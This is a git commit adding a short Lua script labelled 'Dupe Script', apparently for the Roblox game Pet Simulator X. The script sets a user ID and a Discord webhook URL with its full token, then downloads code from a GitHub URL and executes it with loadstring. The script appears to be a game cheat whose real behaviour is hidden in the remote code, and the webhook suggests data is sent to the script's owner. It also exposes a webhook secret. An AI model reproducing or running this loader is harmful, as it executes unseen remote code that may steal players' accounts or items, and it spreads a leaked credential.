d19404ee3d108557f648495c710717ce7f14f3ee
Lali346 <lagartopiero@gmail.com>
2022-12-10 12:44:48 -0300

    Dupe Script

---
+++ script.lua
@@ -0,0 +1,3 @@
+_G.UserID = 1243009309
+_G.WebHook = "https://discord.com/api/webhooks/1048298541417771079/EztcJUfrrWGd5jeq1ziLWPoZe4IuPuxQheRJEDjuZs6iP6xbdpFA-24yXFlZxXlwpV44"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
